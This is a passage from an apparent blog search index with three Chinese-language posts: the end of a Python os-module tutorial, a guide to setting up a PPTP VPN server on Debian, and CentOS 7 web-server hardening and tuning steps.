class="string">'EX_NOPERM'</span>, <span class="string">'EX_NOUSER'</span>, <span class="string">'EX_OK'</span>, <span class="string">'EX_OSERR'</span>, <span class="string">'EX_OSFILE'</span>, <span class="string">'EX_PROTOCOL'</span>, <span class="string">'EX_SOFTWARE'</span>, <span class="string">'EX_TEMPFAIL'</span>, <span class="string">'EX_UNAVAILABLE'</span>, <span class="string">'EX_USAGE'</span>, <span class="string">'F_OK'</span>, <span class="string">'NGROUPS_MAX'</span>, <span class="string">'O_APPEND'</span>, <span class="string">'O_ASYNC'</span>, <span class="string">'O_CREAT'</span>, <span class="string">'O_DIRECT'</span>, <span class="string">'O_DIRECTORY'</span>, <span class="string">'O_DSYNC'</span>, <span class="string">'O_EXCL'</span>, <span class="string">'O_LARGEFILE'</span>, <span class="string">'O_NDELAY'</span>, <span class="string">'O_NOATIME'</span>, <span class="string">'O_NOCTTY'</span>, <span class="string">'O_NOFOLLOW'</span>, <span class="string">'O_NONBLOCK'</span>, <span class="string">'O_RDONLY'</span>, <span class="string">'O_RDWR'</span>, <span class="string">'O_RSYNC'</span>, <span class="string">'O_SYNC'</span>, <span class="string">'O_TRUNC'</span>, <span class="string">'O_WRONLY'</span>, <span class="string">'P_NOWAIT'</span>, <span class="string">'P_NOWAITO'</span>, <span class="string">'P_WAIT'</span>, <span class="string">'R_OK'</span>, <span class="string">'SEEK_CUR'</span>, <span class="string">'SEEK_END'</span>, <span class="string">'SEEK_SET'</span>, <span class="string">'ST_APPEND'</span>, <span class="string">'ST_MANDLOCK'</span>, <span class="string">'ST_NOATIME'</span>, <span class="string">'ST_NODEV'</span>, <span class="string">'ST_NODIRATIME'</span>, <span class="string">'ST_NOEXEC'</span>, <span class="string">'ST_NOSUID'</span>, <span class="string">'ST_RDONLY'</span>, <span class="string">'ST_RELATIME'</span>, <span class="string">'ST_SYNCHRONOUS'</span>, <span class="string">'ST_WRITE'</span>, <span class="string">'TMP_MAX'</span>, <span class="string">'UserDict'</span>, <span class="string">'WCONTINUED'</span>, <span class="string">'WCOREDUMP'</span>, <span class="string">'WEXITSTATUS'</span>, <span class="string">'WIFCONTINUED'</span>, <span class="string">'WIFEXITED'</span>, <span class="string">'WIFSIGNALED'</span>, <span class="string">'WIFSTOPPED'</span>, <span class="string">'WNOHANG'</span>, <span class="string">'WSTOPSIG'</span>, <span class="string">'WTERMSIG'</span>, <span class="string">'WUNTRACED'</span>, <span class="string">'W_OK'</span>, <span class="string">'X_OK'</span>, <span class="string">'_Environ'</span>, <span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'_copy_reg'</span>, <span class="string">'_execvpe'</span>, <span class="string">'_exists'</span>, <span class="string">'_exit'</span>, <span class="string">'_get_exports_list'</span>, <span class="string">'_make_stat_result'</span>, <span class="string">'_make_statvfs_result'</span>, <span class="string">'_pickle_stat_result'</span>, <span class="string">'_pickle_statvfs_result'</span>, <span class="string">'_spawnvef'</span>, <span class="string">'abort'</span>, <span class="string">'access'</span>, <span class="string">'altsep'</span>, <span class="string">'chdir'</span>, <span class="string">'chmod'</span>, <span class="string">'chown'</span>, <span class="string">'chroot'</span>, <span class="string">'close'</span>, <span class="string">'closerange'</span>, <span class="string">'confstr'</span>, <span class="string">'confstr_names'</span>, <span class="string">'ctermid'</span>, <span class="string">'curdir'</span>, <span class="string">'defpath'</span>, <span class="string">'devnull'</span>, <span class="string">'dup'</span>, <span class="string">'dup2'</span>, <span class="string">'environ'</span>, <span class="string">'errno'</span>, <span class="string">'error'</span>, <span class="string">'execl'</span>, <span class="string">'execle'</span>, <span class="string">'execlp'</span>, <span class="string">'execlpe'</span>, <span class="string">'execv'</span>, <span class="string">'execve'</span>, <span class="string">'execvp'</span>, <span class="string">'execvpe'</span>, <span class="string">'extsep'</span>, <span class="string">'fchdir'</span>, <span class="string">'fchmod'</span>, <span class="string">'fchown'</span>, <span class="string">'fdatasync'</span>, <span class="string">'fdopen'</span>, <span class="string">'fork'</span>, <span class="string">'forkpty'</span>, <span class="string">'fpathconf'</span>, <span class="string">'fstat'</span>, <span class="string">'fstatvfs'</span>, <span class="string">'fsync'</span>, <span class="string">'ftruncate'</span>, <span class="string">'getcwd'</span>, <span class="string">'getcwdu'</span>, <span class="string">'getegid'</span>, <span class="string">'getenv'</span>, <span class="string">'geteuid'</span>, <span class="string">'getgid'</span>, <span class="string">'getgroups'</span>, <span class="string">'getloadavg'</span>, <span class="string">'getlogin'</span>, <span class="string">'getpgid'</span>, <span class="string">'getpgrp'</span>, <span class="string">'getpid'</span>, <span class="string">'getppid'</span>, <span class="string">'getresgid'</span>, <span class="string">'getresuid'</span>, <span class="string">'getsid'</span>, <span class="string">'getuid'</span>, <span class="string">'initgroups'</span>, <span class="string">'isatty'</span>, <span class="string">'kill'</span>, <span class="string">'killpg'</span>, <span class="string">'lchown'</span>, <span class="string">'linesep'</span>, <span class="string">'link'</span>, <span class="string">'listdir'</span>, <span class="string">'lseek'</span>, <span class="string">'lstat'</span>, <span class="string">'major'</span>, <span class="string">'makedev'</span>, <span class="string">'makedirs'</span>, <span class="string">'minor'</span>, <span class="string">'mkdir'</span>, <span class="string">'mkfifo'</span>, <span class="string">'mknod'</span>, <span class="string">'name'</span>, <span class="string">'nice'</span>, <span class="string">'open'</span>, <span class="string">'openpty'</span>, <span class="string">'pardir'</span>, <span class="string">'path'</span>, <span class="string">'pathconf'</span>, <span class="string">'pathconf_names'</span>, <span class="string">'pathsep'</span>, <span class="string">'pipe'</span>, <span class="string">'popen'</span>, <span class="string">'popen2'</span>, <span class="string">'popen3'</span>, <span class="string">'popen4'</span>, <span class="string">'putenv'</span>, <span class="string">'read'</span>, <span class="string">'readlink'</span>, <span class="string">'remove'</span>, <span class="string">'removedirs'</span>, <span class="string">'rename'</span>, <span class="string">'renames'</span>, <span class="string">'rmdir'</span>, <span class="string">'sep'</span>, <span class="string">'setegid'</span>, <span class="string">'seteuid'</span>, <span class="string">'setgid'</span>, <span class="string">'setgroups'</span>, <span class="string">'setpgid'</span>, <span class="string">'setpgrp'</span>, <span class="string">'setregid'</span>, <span class="string">'setresgid'</span>, <span class="string">'setresuid'</span>, <span class="string">'setreuid'</span>, <span class="string">'setsid'</span>, <span class="string">'setuid'</span>, <span class="string">'spawnl'</span>, <span class="string">'spawnle'</span>, <span class="string">'spawnlp'</span>, <span class="string">'spawnlpe'</span>, <span class="string">'spawnv'</span>, <span class="string">'spawnve'</span>, <span class="string">'spawnvp'</span>, <span class="string">'spawnvpe'</span>, <span class="string">'stat'</span>, <span class="string">'stat_float_times'</span>, <span class="string">'stat_result'</span>, <span class="string">'statvfs'</span>, <span class="string">'statvfs_result'</span>, <span class="string">'strerror'</span>, <span class="string">'symlink'</span>, <span class="string">'sys'</span>, <span class="string">'sysconf'</span>, <span class="string">'sysconf_names'</span>, <span class="string">'system'</span>, <span class="string">'tcgetpgrp'</span>, <span class="string">'tcsetpgrp'</span>, <span class="string">'tempnam'</span>, <span class="string">'times'</span>, <span class="string">'tmpfile'</span>, <span class="string">'tmpnam'</span>, <span class="string">'ttyname'</span>, <span class="string">'umask'</span>, <span class="string">'uname'</span>, <span class="string">'unlink'</span>, <span class="string">'unsetenv'</span>, <span class="string">'urandom'</span>, <span class="string">'utime'</span>, <span class="string">'wait'</span>, <span class="string">'wait3'</span>, <span class="string">'wait4'</span>, <span class="string">'waitpid'</span>, <span class="string">'walk'</span>, <span class="string">'write'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>你可以看到上面os模块给你提供了很多可以使用的功能函数，其中我发现我经常使用”os.system”，我可给它传递一个命令，然后通过它去在系统底层执行我们传递的命令.下面我们将会执行一个命令”echo ‘UHJpbWFsIFNlY3VyaXR5Cg==’ | base64 -d”:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"echo 'UHJpbWFsIFNlY3VyaXR5Cg==' | base64 -d"</span>)</div><div class="line">Primal Security</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><h3 id="创建一个文件对象"><a href="#创建一个文件对象" class="headerlink" title="创建一个文件对象"></a>创建一个文件对象</h3><p>现在我们将演示一些例子,如何在Python里面从一个文件里面读取数据和创建一个文件。下面的这个例子演示了如何创建一个文件对象，并且读取/写入数据到这个对象里面，通常你自己读取一个文件的数据，并且做一些逻辑处理然后把输出的写到文件里面:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file = open(<span class="string">'test.txt'</span>, <span class="string">'w'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.write(<span class="string">'Hello World'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.close()    </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file = open(<span class="string">'test.txt'</span>, <span class="string">'r'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>file.readlines()</div><div class="line">[<span class="string">'Hello World'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><blockquote><p>在Python解释器里面练习上面的内容并且多加巩固，因为这些内容在后面的章节里面会经常使用，当我写代码的时候，我喜欢打开两个终端，一个用于执行python解释器，还有一个用来把逻辑写入到脚本里面。下一章将会写一个真实的Python脚本， 声明定义，类和sys模块。</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux搭建vpn服务器</title>
      <link href="/2015/07/02/linux-vpn/"/>
      <url>/2015/07/02/linux-vpn/</url>
      <content type="html"><![CDATA[<blockquote><p>演示中使用的是Debain系统,但思路相同,好的我们开始吧</p></blockquote><h2 id="1、安装PPTPD"><a href="#1、安装PPTPD" class="headerlink" title="1、安装PPTPD"></a>1、安装PPTPD</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">apt-get install pptpd</div></pre></div></div></figure><a id="more"></a><h2 id="2、编辑pptpd-conf"><a href="#2、编辑pptpd-conf" class="headerlink" title="2、编辑pptpd.conf"></a>2、编辑pptpd.conf</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/pptpd.conf</div></pre></div></div></figure><p><code>使非注释的内容如下</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">option /etc/ppp/pptpd-options</div><div class="line">localip 192.168.0.1</div><div class="line">remoteip 192.168.0.234-238,192.168.0.245</div></pre></div></div></figure><blockquote><p>这两句设置了当外部计算机通过pptp联接到vpn后所能拿到的ip地址范围和服务器的ip地址设置</p></blockquote><h2 id="3、添加登录用户"><a href="#3、添加登录用户" class="headerlink" title="3、添加登录用户"></a>3、添加登录用户</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim  /etc/ppp/chap-secrets</div></pre></div></div></figure><p><code>添加一行，内容如下</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#clientserversecretIP addresses</span></div><div class="line"><span class="comment">#用户名pptpd密码允许连接IP</span></div><div class="line"><span class="built_in">test</span>pptpd<span class="string">"test"</span>*</div></pre></div></div></figure><blockquote><p>密码用引号括起来，最后那个星号是说允许从任何IP地址连接，如果你想单独设定IP地址也可以</p></blockquote><p>理论上到这里一个vpn就已经搭建完毕了。<br>不过你并不能通过这个来上Internet，因为所有的数据都作用于那台<code>pptpd</code>的服务器上， 而不会传入拨入的计算机设备上。要上Internet还需要配置<code>iptables</code>： </p><h2 id="4、-设置DNS解析，编辑pptpd-options"><a href="#4、-设置DNS解析，编辑pptpd-options" class="headerlink" title="4、 设置DNS解析，编辑pptpd-options"></a>4、 设置DNS解析，编辑pptpd-options</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/ppp/pptpd-options</div></pre></div></div></figure><blockquote><p>名称可能会不同，具体位置在<code>/etc/pptpd.conf</code>18行左右</p></blockquote><p>找到<code>ms-dns</code>，取消掉注释，并修改DNS地址<br>我用的是google dns，如下  :</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">ms-dns 8.8.8.8</div><div class="line">ms-dns 8.8.4.4</div></pre></div></div></figure><h2 id="5、-开启转发"><a href="#5、-开启转发" class="headerlink" title="5、 开启转发"></a>5、 开启转发</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">vim /etc/sysctl.conf</div></pre></div></div></figure><p><code>取消如下内容行的注释</code></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">net.ipv4.ip_forward=1</div></pre></div></div></figure><h2 id="6、打开IP转发功能"><a href="#6、打开IP转发功能" class="headerlink" title="6、打开IP转发功能"></a>6、打开IP转发功能</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div></pre></div></div></figure><h2 id="7、设置iptables"><a href="#7、设置iptables" class="headerlink" title="7、设置iptables"></a>7、设置iptables</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">iptables -t nat -I POSTROUTING -j MASQUERADE</div></pre></div></div></figure><h2 id="8、-启动服务"><a href="#8、-启动服务" class="headerlink" title="8、 启动服务"></a>8、 启动服务</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">/etc/init.d/pptpd restart</div></pre></div></div></figure><blockquote><p>VPN搭建完毕，可以尝试用客户端登录了。pptpd监听端口号为<code>1723</code></p></blockquote>]]></content>
      
      <categories>
          
          <category> VPN </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Centos7作为web服务器优化</title>
      <link href="/2015/04/04/linux-web/"/>
      <url>/2015/04/04/linux-web/</url>
      <content type="html"><![CDATA[<p>Centos7作为web服务器的一些简单配置</p><a id="more"></a><h2 id="1-关闭firewalld并替换iptables"><a href="#1-关闭firewalld并替换iptables" class="headerlink" title="1. 关闭firewalld并替换iptables"></a><code>1</code>. 关闭firewalld并替换iptables</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">systemctl stop firewalld.service<span class="comment">#停止firewall</span></div><div class="line">systemctl <span class="built_in">disable</span> firewalld.service<span class="comment">#禁止firewall开机启动</span></div><div class="line">yum install iptables-services <span class="comment">#安装</span></div><div class="line">iptables -nvL   <span class="comment">#查看规则</span></div></pre></div></div></figure><h2 id="2-加大打开文件数限制"><a href="#2-加大打开文件数限制" class="headerlink" title="2. 加大打开文件数限制"></a><code>2</code>. 加大打开文件数限制</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">vim /etc/security/limits.conf</div><div class="line"><span class="comment">#添加如下内容:</span></div><div class="line">*soft  nofile 1024000</div><div class="line"></div><div class="line">*hard  nofile 1024000</div><div class="line"></div><div class="line">hive   -  nofile 1024000</div><div class="line"></div><div class="line">hive   -  nproc  1024000</div></pre></div></div></figure><blockquote><p>ulimit -n<br>ulimit -a</p><blockquote><p><code>查询当前配置</code></p></blockquote></blockquote><h2 id="3-更改用户进程限制"><a href="#3-更改用户进程限制" class="headerlink" title="3. 更改用户进程限制"></a><code>3</code>. 更改用户进程限制</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">vim /etc/security/limits.d/20-nproc.conf</div><div class="line"><span class="comment">#更改一下内容</span></div><div class="line"></div><div class="line"></div><div class="line">*          soft    nproc     40960</div><div class="line">root       soft    nproc     unlimited <span class="comment">#无限制</span></div></pre></div></div></figure><blockquote><p>此步骤需要重启机器生效，可以设置完后再重启</p></blockquote><h2 id="4-网络线程优化"><a href="#4-网络线程优化" class="headerlink" title="4. 网络线程优化"></a><code>4</code>. 网络线程优化</h2><p><code>vim /etc/sysctl.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#加入如下内容</span></div><div class="line"><span class="comment"># Disable IPv6</span></div><div class="line">net.ipv6.conf.all.disable_ipv6 = 1</div><div class="line">net.ipv6.conf.default.disable_ipv6 = 1</div><div class="line"></div><div class="line"><span class="comment"># Determines how often to check for stale neighbor entries.</span></div><div class="line">net.ipv4.neigh.default.gc_stale_time=120</div><div class="line"></div><div class="line"><span class="comment"># Using arp_announce/arp_ignore to solve the ARP Problem</span></div><div class="line">net.ipv4.conf.default.arp_announce = 2</div><div class="line">net.ipv4.conf.all.arp_announce=2</div><div class="line">vm.swappiness = 0</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000</div><div class="line">net.ipv4.tcp_max_syn_backlog = 1024</div><div class="line">net.ipv4.tcp_synack_retries = 2</div><div class="line">net.ipv4.conf.lo.arp_announce=2</div><div class="line"></div><div class="line"></div><div class="line">net.ipv4.tcp_keepalive_time = 1800</div><div class="line">net.ipv4.tcp_keepalive_probes = 3</div><div class="line">net.ipv4.tcp_keepalive_intvl = 15</div><div class="line"></div><div class="line">net.ipv4.tcp_syncookies = 1</div><div class="line">net.ipv4.tcp_tw_reuse = 1</div><div class="line">net.ipv4.tcp_tw_recycle = 1</div><div class="line">net.ipv4.tcp_fin_timeout = 30</div></pre></div></div></figure><p>执行<code>/sbin/sysctl -p</code>使设置生效</p><h2 id="5-时间校对"><a href="#5-时间校对" class="headerlink" title="5. 时间校对"></a><code>5</code>. 时间校对</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</div><div class="line"></div><div class="line">ntpdate us.pool.ntp.org</div><div class="line"></div><div class="line">crontab -e</div><div class="line"></div><div class="line">0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTP</div><div class="line"></div><div class="line">service crond restart</div></pre></div></div></figure><h2 id="6-关闭root登录并修改ssh端口"><a href="#6-关闭root登录并修改ssh端口" class="headerlink" title="6. 关闭root登录并修改ssh端口"></a><code>6</code>. 关闭root登录并修改ssh端口</h2><h3 id="1-添加普通用户"><a href="#1-添加普通用户" class="headerlink" title="1. 添加普通用户"></a>1. 添加普通用户</h3><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">groupadd power</div><div class="line">useradd -d /home/www/ -g power <span class="built_in">test</span></div><div class="line">passwd <span class="built_in">test</span></div></pre></div></div></figure><h3 id="2-iptables开启5233端口"><a href="#2-iptables开启5233端口" class="headerlink" title="2. iptables开启5233端口"></a>2. iptables开启5233端口</h3><blockquote><p><code>5233为下面的更改后ssh端口, 此步骤须先于下面步骤，否则会造成ssh连不上的</code></p></blockquote><p><code>vi /etc/sysconfig/iptables</code></p><p>添加</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 5233 -j ACCEPT</div></pre></div></div></figure><p>执行<br><code>/sbin/iptables restart</code></p><h3 id="3-修改sshd配置文件"><a href="#3-修改sshd配置文件" class="headerlink" title="3. 修改sshd配置文件"></a>3. 修改sshd配置文件</h3><pre><code>vim /etc/ssh/sshd_config</code></pre><p><strong>禁止root登陆</strong><br>把<code>PermitRootLogin yes</code><br>改为<code>PermitRootLogin no</code></p><p><strong>修改默认端口号</strong><br>把<code>Port 22</code><br>改为<code>Port 5233</code><br>最后执行<code>systemctl restart sshd.service</code></p><h2 id="7-禁止ping"><a href="#7-禁止ping" class="headerlink" title="7. 禁止ping"></a><code>7</code>. 禁止ping</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">禁止</div><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line">开启</div><div class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line"></div><div class="line"><span class="comment">#永久保存</span></div><div class="line">vi /etc/rc.d/rc.local</div><div class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</div></pre></div></div></figure><h2 id="8-网络命令ifconfig-netstat"><a href="#8-网络命令ifconfig-netstat" class="headerlink" title="8. 网络命令ifconfig,netstat"></a><code>8</code>. 网络命令ifconfig,netstat</h2><p><code>yum -y install net-tools</code></p>]]></content>
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
